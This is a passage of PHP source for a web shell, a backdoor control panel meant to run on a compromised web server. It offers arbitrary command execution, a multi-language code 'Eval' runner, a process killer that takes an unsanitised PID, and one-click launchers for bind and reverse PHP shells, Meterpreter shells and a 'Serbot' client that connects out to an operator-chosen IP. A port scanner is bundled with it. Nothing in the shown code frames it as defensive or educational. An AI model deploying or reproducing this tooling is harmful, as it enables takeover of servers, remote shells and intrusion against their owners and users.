			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "popen")
			{
				$pid = popen($decCommand." 2>&1","r");
				$response = fread($pid, 2096);
				pclose($pid);
			}

			if(isset($_SESSION["command_function"]) && $_SESSION["command_function"] == "proc_open")
			{
				$process = proc_open(
					$decCommand." 2>&1",	
					array(
						0 => array("pipe", "r"),
						1 => array("pipe", "w"),
						2 => array("pipe", "w"),
					),
					$pipes
				);
	
				if ($process !== false)
				{
					$stdout = stream_get_contents($pipes[1]);
					$stderr = stream_get_contents($pipes[2]);
					fclose($pipes[1]);
					fclose($pipes[2]);
					proc_close($process);
		
					if ($stderr != "")
					{
						$response = $stderr;
					}
					else
					{
						$response = $stdout;
					}
				}
				else
				{
					$response = "Fail";
				}
			}
			
						
			echo "<table class='flat-table flat-table-1'>";
			echo "<tr><td>".$decCommand."</td>";
			echo "<td><pre>";
			echo strip_tags($response);
			echo "</pre></td></tr>";
			echo "</table>";
		}
					
		$parts = explode(" ", $decCommand);
		if($parts[0] == "cd")
		{
			if(file_exists($parts[1]))
			{
				$_SESSION["directory"] = $parts[1];
				echo '<meta http-equiv="refresh" content="0" />';			
			}
			else
			{
				echo "<pre>Directory does not exist</pre>";
			}		
		}
	}
}
?>


<br><br><h3><A NAME='Eval' href="#Eval">Eval</A></h3>

<form action="#Eval" method="POST">
	<textarea name="eval" style="width: 400px; height: 100px;"></textarea><br>
	<select name="language">
		<?php
		if ($eval == True)
		{
			echo "<option value='php'>PHP</option>";
		}
		if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
		{
			if(command_exists("python") != "" && strpos(command_exists("python"), "INFO:")===false)
			{
				echo "<option value='python'>Python</option>";
			}
			
			if(command_exists("perl") != ""  && strpos(command_exists("perl"), "INFO:")===false)
			{
				echo "<option value='perl'>Perl</option>";
			}			

			if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				echo "<option value='batch'>Batch</option>";
				echo "<option value='powershell'>Powershell</option>";
			}
			else
			{
				echo "<option value='bash'>Bash</option>";
			}			
			
			if(command_exists("ruby") != ""  && strpos(command_exists("python"), "INFO:")===false)
			{
				echo "<option value='ruby'>Ruby</option>";		
			}			
			
			if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN')
			{
				if(command_exists("gcc") != "")
				{			
					echo "<option value='c'>C</option>";
				}
							
				if(command_exists("g++") != "")
				{
					echo "<option value='cpp'>C++</option>";
				}
			}
		}
		?>
	</select>
	<input type="submit" name="run" value="run" onclick="return base64encode2(this.form, this.form.language, this.form.eval);"/>
</form>

<?php
if(isset($_POST["run"]))
{
	$decEval = base64_decode($_POST["eval"]);

	if($_POST["language"] == "php")
	{
		if ($eval == True)
		{
			$clean = str_replace("<?php", "", $decEval);
			$clean = str_replace("<?", "", $clean);
			$clean = str_replace("<?=", "", $clean);		
			$clean = str_replace("?>", "", $clean);
			eval($clean);
		}
	}
	
	if($_POST["language"] == "python")
	{
		if(command_exists("python") != "")
		{
			$filename = rand(1,1000) . ".py";
			
			if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				$filename = "%temp%\\".$filename;
			}			
			else
			{
				$filename = "/tmp/".$filename;
			}

			file_put_contents("$filename", $decEval);
			$command = "python $filename 2>&1";
			evalRel($command);
			unlink("$filename");
		}
	}
	
	if($_POST["language"] == "bash")
	{
		if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
		{
			$filename = rand(1,1000) . ".sh";
			$filename = "/tmp/".$filename;
			file_put_contents($filename, $decEval);
			shell_exec("chmod 777 $filename");
			$command = "./$filename 2>&1";
			evalRel($command);
			unlink($filename);
		}
	}	
	
	if($_POST["language"] == "perl")
	{
		if(command_exists("perl") != "")
		{
			$filename = rand(1,1000) . ".pl";
			
			if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				$filename = "%temp%\\".$filename;
			}
			else
			{
				$filename = "/tmp/".$filename;
			}			
					
			file_put_contents($filename, $decEval);
			$command = "perl $filename 2>&1";
			evalRel($command);
			unlink($filename);
		}
	}
	
	if($_POST["language"] == "ruby")
	{
		if(command_exists("ruby") != "")
		{
			$filename = rand(1,1000) . ".rb";
			
			if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				$filename = "%temp%\\".$filename;
			}			
			else
			{
				$filename = "/tmp/".$filename;
			}
			
			file_put_contents($filename, $decEval);
			$command = "ruby $filename 2>&1";
			evalRel($command);
			unlink($filename);
		}
	}
	
	
	if($_POST["language"] == "c")
	{
		if(command_exists("gcc") != "")
		{
			$filename = rand(1,1000);
			
			if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				$filename = "%temp%\\".$filename;
			}
			else
			{
				$filename = "/tmp/".$filename;
			}			
			
			$extension = "c";
			file_put_contents("$filename.$extension", $decEval);
			echo shell_exec("gcc -o $filename $filename.$extension 2>&1");
			$command = "./$filename";
			evalRel($command);
			unlink($filename);
		}
	}
	
	if($_POST["language"] == "cpp")
	{
		if(command_exists("g++") != "")
		{
			$filename = rand(1,1000);
			
			if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
			{
				$filename = "%temp%\\".$filename;
			}
			else
			{
				$filename = "/tmp/".$filename;
			}
			
			$extension = "cpp";
			file_put_contents("$filename.$extension", $decEval);
			echo shell_exec("g++ -o $filename $filename.$extension 2>&1");
			$command = "./$filename";
			evalRel($command);
			unlink($filename);
		}
	}
	
	if($_POST["language"] == "powershell")
	{
		if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
		{
			if(command_exists("powershell") != "")
			{
				$filename = rand(1,1000);
				$filename = "%temp%\\".$filename;
				$extension = "ps1";
				file_put_contents("$filename.$extension", $decEval);
				$command = "Powershell.exe -executionpolicy remotesigned -File $filename.$extension";
				evalRel($command);
				unlink("$filename.$extension");
			}
		}
		else
		{
			echo "<p class='danger'>This ain't no Windows machine mate!</p>";
		}
	}		
	
	if($_POST["language"] == "batch")
	{
		if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
		{
			$filename = rand(1,1000);
			$filename = "/tmp/".$filename;
			$extension = "bat";
			file_put_contents("$filename.$extension", $decEval);
			$command = "$filename.$extension";
			evalRel($command);
			unlink("$filename.$extension");
		}
	}		
}

?>

<br><br><h3><A NAME='Process Manager' href="#Process Manager">Process Manager</A></h3>

<?php
if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN')
{
	if(isset($_GET["kill"]))
	{
		if ($shell_exec == True)
		{
			$kill = shell_exec("taskkill /F /PID " . $_GET["kill"] . " 2>&1");
		}			
		else if($exec == True)
		{
			$kill = exec("taskkill /F /PID " . $_GET["kill"] . " 2>&1");
		}
		else if($popen == True)
		{
			$pid = popen("taskkill /F /PID " . $_GET["kill"] . " 2>&1","r");
			$kill = fread($pid, 2096);
			pclose($pid);
		}
		else if($proc_open == true)
		{
			$oprocess = proc_open(
				"taskkill /F /PID " . $_GET["kill"] . " 2>&1",
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($oprocess !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($oprocess);

				if ($stderr == "")
				{
					$kill = $stdout;
				}
				else
				{
					$kill = "Fail";
				}
			}
			else
			{
				$kill = "Fail";
			}
		}
		else
		{
			$kill = "Fail";
		}

		if(strpos($kill, "SUCCESS")!==false)
		{
			echo "Success";
		}			
		else
		{
			echo "Fail";
		}
	}

	if ($shell_exec == True)
	{
		$process_list = shell_exec("tasklist");
	}
	else if ($exec == True)
	{
		$process_list = exec("tasklist");
	}
	else if($popen == True)
	{
		$pid = popen("tasklist","r");
		$process_list = fread($pid, 2096);
		pclose($pid);
	}
	else if($proc_open == true)
	{
		$oprocess = proc_open(
			"tasklist",
			array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"),
			),
			$pipes
		);
	
		if ($oprocess !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($oprocess);

			if ($stderr == "")
			{
				$process_list = $stdout;
			}
			else
			{
				$process_list = "Fail";
			}
		}
		else
		{
			$process_list = "Fail";
		}
	}
	else
	{
		$process_list = "Fail";
	}

	$processes = explode("\n", $process_list);

	echo "<table class='flat-table flat-table-3'>
		<tr>
			<th>Name</th>
			<th>Pid</th>
			<th>Kill</th>
		</tr>";
	
	$i = 0;
	foreach($processes as $process)
	{
		if($i > 2)
		{
			$parts = array_filter(explode(" ", $process));
			$parts = array_values($parts);
			if(isset($parts[0]) && strpos($parts[0], ".")!==false)
			{
				$name = $parts[0];
				$pid = $parts[1];
				echo "
				<tr>
					<td>$name</td>
					<td>$pid</td>
					<td><a href='?kill=$pid#Process Manager'>Kill</a></td>
				</tr>";
			}
		}
		$i++;
	}
	echo "</table>";
}
else
{
	if(isset($_GET["kill"]))
	{
		$pid = $_GET["kill"];
		
		if ($shell_exec == True)
		{
			$output = shell_exec("kill $pid 2>&1");
		}		
		else if($exec == True)
		{
			$output = exec("kill $pid 2>&1");
		}
		else if($popen == True)
		{
			$pid = popen("kill $pid 2>&1","r");
			$output = fread($pid, 2096);
			pclose($pid);
		}
		else if($proc_open == true)
		{
			$oprocess = proc_open(
				"kill $pid 2>&1",
				array(
					0 => array("pipe", "r"),
					1 => array("pipe", "w"),
					2 => array("pipe", "w"),
				),
				$pipes
			);
	
			if ($oprocess !== false)
			{
				$stdout = stream_get_contents($pipes[1]);
				$stderr = stream_get_contents($pipes[2]);
				fclose($pipes[1]);
				fclose($pipes[2]);
				proc_close($oprocess);

				if ($stderr == "")
				{
					$output = $stdout;
				}
				else
				{
					$output = "Fail";
				}
			}
			else
			{
				$output = "Fail";
			}
		}
		else
		{
			$output = "Fail";
		}		

		if(empty($output))
		{
			echo "Success";
		}		
		else
		{
			echo "Fail";
		}
	}

	if ($shell_exec == True)
	{
		$process_list = shell_exec("ps aux");
	}
	else if ($exec == True)
	{
		$process_list = exec("ps aux");
	}
	else if($popen == True)
	{
		$pid = popen("ps aux","r");
		$process_list = fread($pid, 2096);
		pclose($pid);
	}
	else if($proc_open == true)
	{
		$oprocess = proc_open(
			"ps aux",
			array(
				0 => array("pipe", "r"),
				1 => array("pipe", "w"),
				2 => array("pipe", "w"),
			),
			$pipes
		);
	
		if ($oprocess !== false)
		{
			$stdout = stream_get_contents($pipes[1]);
			$stderr = stream_get_contents($pipes[2]);
			fclose($pipes[1]);
			fclose($pipes[2]);
			proc_close($oprocess);

			if ($stderr == "")
			{
				$process_list = $stdout;
			}
			else
			{
				$process_list = "Fail";
			}
		}
		else
		{
			$process_list = "Fail";
		}
	}
	else
	{
		$process_list = "Fail";
	}

	$processes = explode("\n", $process_list);

	echo "<table class='flat-table flat-table-3'>
		<tr>
			<th>User</th>
			<th>PID</th>
			<th>Process</th>
			<th>Kill</th>
		</tr>";

	$i = 0;
	foreach($processes as $process)
	{
		if($i > 0 && isset($process[0]))
		{
			$parts = array_filter(explode(" ", $process));
			$parts = array_values($parts);	
			$user = $parts[0];
			$pid = $parts[1];
			$command = array_pop($parts);
			
			echo "
			<tr>
				<td>$user</td>
				<td>$pid</td>
				<td>$command</td>
				<td><a href='?kill=$pid#Process Manager'>Kill</a></td>
			</tr>";
		}
		$i++;
	}
	echo "</table>";
}

if(isset($_GET["shell"]) && ($_GET["shell"] == "bps"))
{
	global $phpbindshell, $nohup;

	if(isset($_POST['bind_port']))
	{
		if ($_POST['bind_port'] != "")
		{
			$port = $_POST['bind_port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$phpbindshell = str_replace("\$port=4444;", "\$port=$port;", $phpbindshell);
	
	$filename = rand(1,1000) . ".php";

	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = "%temp%\\".$filename;
	}			
	else
	{
		$filename = "/tmp/".$filename;
	}

	file_put_contents($filename, $phpbindshell);
	if ($nohup == True)
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "php '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

if(isset($_GET["shell"]) && ($_GET["shell"] == "rps"))
{
	global $phpreverseshell, $nohup;

	if(isset($_POST['port']))
	{
		if ($_POST['port'] != "")
		{
			$port = $_POST['port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$phpreverseshell = str_replace("\$port=4444;", "\$port=$port;", $phpreverseshell);
	$phpreverseshell = str_replace("\$ipaddr='192.168.1.104';", "\$ipaddr='".$_POST['ip']."';", $phpreverseshell);

	$filename = rand(1,1000) . ".php";

	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = "%temp%\\".$filename;
	}			
	else
	{
		$filename = "/tmp/".$filename;
	}

	file_put_contents($filename, $phpbindshell);
	if ($nohup == True)
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "php '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

if(isset($_GET["shell"]) && ($_GET["shell"] == "bmps"))
{
	global $meterpreterbindshell, $nohup;

	if(isset($_POST['port']))
	{
		if ($_POST['port'] != "")
		{
			$port = $_POST['port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$meterpreterbindshell = str_replace("\$port = 4444;", "\$port = $port;", $meterpreterbindshell);
	$filename = rand(1,1000) . ".php";

	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = "%temp%\\".$filename;
	}			
	else
	{
		$filename = "/tmp/".$filename;
	}

	file_put_contents($filename, $meterpreterbindshell);
	if ($nohup == True)
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "php '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

if(isset($_GET["shell"]) && ($_GET["shell"] == "rmps"))
{
	global $meterpreterreverseshell, $nohup;

	if(isset($_POST['port']))
	{
		if ($_POST['port'] != "")
		{
			$port = $_POST['port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$meterpreterreverseshell = str_replace("\$port = 4444;", "\$port = $port;", $meterpreterreverseshell);
	$meterpreterreverseshell = str_replace("\$ip = '192.168.1.104';", "\$ip = '".$_POST['ip']."';", $meterpreterreverseshell);
	$filename = rand(1,1000) . ".php";

	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = "%temp%\\".$filename;
	}			
	else
	{
		$filename = "/tmp/".$filename;
	}

	file_put_contents($filename, $meterpreterreverseshell);
	if ($nohup == True)
	{
		$command = "nohup php '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "php '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

if(isset($_GET["shell"]) && ($_GET["shell"] == "sc"))
{
	global $serbotclient, $nohup;

	if(isset($_POST['port']))
	{
		if ($_POST['port'] != "")
		{
			$port = $_POST['port'];
		}
		else
		{
			$port = 31337;
		}
	}	
	else
	{
		$port = 31337;
	}

	$serbotclient = str_replace("port = 4444", "port = $port", $serbotclient);
	$serbotclient = str_replace("host = \"192.168.1.4\"", "host = \"".$_POST['ip']."\"", $serbotclient);
	$filename = rand(1,1000) . ".py";

	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = "%temp%\\".$filename;
	}			
	else
	{
		$filename = "/tmp/".$filename;
	}

	file_put_contents($filename, $serbotclient);
	if ($nohup == True)
	{
		$command = "nohup python '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "python '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

if(isset($_GET["tool"]) && ($_GET["tool"] == "bpscan"))
{
	global $bpscan, $nohup;

	$bpscan = str_replace("'IP': '127.0.0.1',", "'IP': '".$_SERVER['SERVER_ADDR']."',", $bpscan);

	$filename = "bpscan.py";
	if (!strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
	{
		$filename = getcwd()."\\".$filename;
	}
	else
	{
		$filename = getcwd()."/".$filename;
	}

	file_put_contents($filename, $bpscan);
	if ($nohup == True)
	{
		$command = "nohup python '$filename' > /dev/null 2>&1 &";
		evalRel($command);
	}
	else
	{
		$command = "python '$filename' 2>&1";
		evalRel($command);
		unlink($filename);
	}
}

function zipWindows($zip_location, $folder)
{

global $shell_exec, $exec, $popen, $proc_open, $system, $passthru;

$code = 'ArchiveFolder "' . $zip_location . '", "' . $folder . '"

Sub ArchiveFolder (zipFile, sFolder)

    With CreateObject("Scripting.FileSystemObject")
        zipFile = .GetAbsolutePathName(zipFile)
        sFolder = .GetAbsolutePathName(sFolder)

        With .CreateTextFile(zipFile, True)
            .Write Chr(80) & Chr(75) & Chr(5) & Chr(6) & String(18, chr(0))
        End With
    End With

    With CreateObject("Shell.Application")
        .NameSpace(zipFile).CopyHere .NameSpace(sFolder).Items

        Do Until .NameSpace(zipFile).Items.Count = _
                 .NameSpace(sFolder).Items.Count
            WScript.Sleep 1000 
        Loop
    End With

End Sub';


file_put_contents("zipFolder.vbs", $code);

if ($shell_exec == True)
{
	echo shell_exec("cscript //nologo zipFolder.vbs");
}
else if($exec == True)
{
	echo exec("cscript //nologo zipFolder.vbs");
}
else if($passthru == True)
{
	passthru("cscript //nologo zipFolder.vbs");
}
else if($system == True)
{
	system("cscript //nologo zipFolder.vbs");
}
else if($popen == true)
{
	$pid = popen("cscript //nologo zipFolder.vbs","r");
	while(!feof($pid))
	{
		echo fread($pid, 256);
		flush();
 		ob_flush();
		usleep(100000);
	}
	pclose($pid);
}
else if($proc_open == true)
{
	$process = proc_open(
		"cscript //nologo zipFolder.vbs",	
		array(
			0 => array("pipe", "r"),
			1 => array("pipe", "w"),
			2 => array("pipe", "w"),
		),
		$pipes
	);
	
	if ($process !== false)
	{
		$stdout = stream_get_contents($pipes[1]);
		$stderr = stream_get_contents($pipes[2]);
		fclose($pipes[1]);
		fclose($pipes[2]);
		proc_close($process);
		
		if ($stderr != "")
		{
			echo $stderr;
		}
		else
		{
			echo $stdout;
		}
	}
	else
	{
		echo "Fail";
	}
}
else
{
	echo "Fail";
}
}
?>

<br><h3><A NAME='Shells' href="#Shells">Shells</A></h3>

<?php

if ($eval == True)
{
echo "
<table class='flat-table flat-table-3'>
		<form action='?shell=bmps#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Bind Meterpreter PHP Shell</td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/></td>
			</tr>
		</form>
</table>

<table class='flat-table flat-table-3'>
		<form action='?shell=rmps#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Reverse Meterpreter PHP Shell</td>
			</tr>
			<tr>
				<td>IP</td>
				<td><input style='width:300px' name='ip' type='text'/></td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/></td>
			</tr>
		</form>
</table>
";
}

if (($proc_open == True) || ($popen == True) || ($shell_exec == True) || ($exec == True) || ($system == True) || ($passthru == True))
{
echo "
<table class='flat-table flat-table-3'>
		<form action='?shell=bps#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Bind PHP Shell</td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='bind_port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/></td>
			</tr>
		</form>
</table>

<table class='flat-table flat-table-3'>
		<form action='?shell=rps#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Reverse PHP Shell</td>
			</tr>
			<tr>
				<td>IP</td>
				<td><input style='width:300px' name='ip' type='text'/></td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/></td>
			</tr>
		</form>
</table>

<table class='flat-table flat-table-3'>
		<form action='?shell=sc#Shells' method='post' >
			<tr>
				<td>Type</td>
				<td>Serbot - Client</td>
			</tr>
			<tr>
				<td>IP</td>
				<td><input style='width:300px' name='ip' type='text'/></td>
			</tr>
			<tr>
				<td>Port</td>
				<td><input style='width:300px' name='port' type='text'/></td>
			</tr>
			<tr>
				<td></td>
				<td><input type='submit' value='Start' name='Start'/></td>
			</tr>
		</form>
</table>

<br><h3><A NAME='Tools' href=\"#Tools\">Tools</A></h3>

<table class='flat-table flat-table-1'>
	<tr>
		<td>Name</td>
		<td>Language</td>
		<td>Author</td>
		<td>Goal</td>
		<td>Description</td>
		<td>Action</td>
	</tr>
	<form action='?tool=bpscan#Tools' method='post' >
		<tr>
			<td>bpscan</td>
			<td>Python</td>
			<td>dotcppfile</td>
			<td>Find useable/unblocked ports.</td>
			<td>bpscan uses basic python socket binding with the service offered by canyouseeme.org to find useable/unblocked ports. The outputs are 'bpscan - errors.txt' and `bpscan - ports.txt' which will hold the found useable/unblocked ports. It uses 25 threads at a time but gets the job done so bare with it.</td>
			<td><input type='submit' value='Start' name='Start'/></td>
		</tr>
	</form>
</table>
";
}
?>

</center>
</body>
</html>
